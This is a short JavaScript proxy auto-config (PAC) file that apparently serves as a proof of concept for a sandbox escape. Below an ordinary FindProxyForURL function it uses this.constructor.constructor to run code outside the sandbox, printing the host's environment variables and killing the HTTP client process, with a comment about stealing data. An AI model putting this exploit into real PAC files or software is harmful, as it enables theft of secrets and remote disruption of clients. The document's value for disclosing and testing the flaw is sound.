// Here's the real PAC function:
function FindProxyForURL(url, host) {
    return "DIRECT";
}

// And here's some bonus arbitrary code:
const f = this.constructor.constructor(`
    // Here, we're running outside the sandbox!
    console.log('Read system env vars:', process.env);
    console.log('!!! PAC file is running arbitrary code !!!');
    process.exit(1); // Kill the HTTP client process remotely
    // ...steal data, break things, etc etc etc
`);
f();
